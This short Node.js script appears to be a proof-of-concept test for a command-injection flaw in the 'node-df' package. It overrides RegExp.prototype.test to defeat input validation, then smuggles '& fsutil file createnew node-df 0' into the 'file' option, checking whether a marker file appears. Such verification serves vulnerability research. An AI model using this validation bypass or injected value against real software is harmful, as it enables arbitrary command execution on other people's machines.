RegExp.prototype.test = () => false;
const df = require('node-df');
const fs = require('fs');
const path = './node-df';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let options = {
    file: '& fsutil file createnew node-df 0',
    prefixMultiplier: 'GB',
    isDisplayPrefixMultiplier: true,
    precision: 2
};
df(options, function (error, response) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});